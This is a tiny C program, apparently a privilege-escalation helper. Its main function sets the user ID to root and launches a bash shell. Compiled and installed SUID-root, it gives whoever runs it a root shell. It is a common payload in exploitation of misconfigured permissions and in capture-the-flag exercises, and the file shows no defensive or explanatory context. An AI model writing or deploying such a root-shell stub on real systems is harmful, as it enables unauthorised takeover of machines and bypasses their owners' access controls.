#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main(void)
{
	setuid(0);
	execlp("bash", "bash", NULL);
}
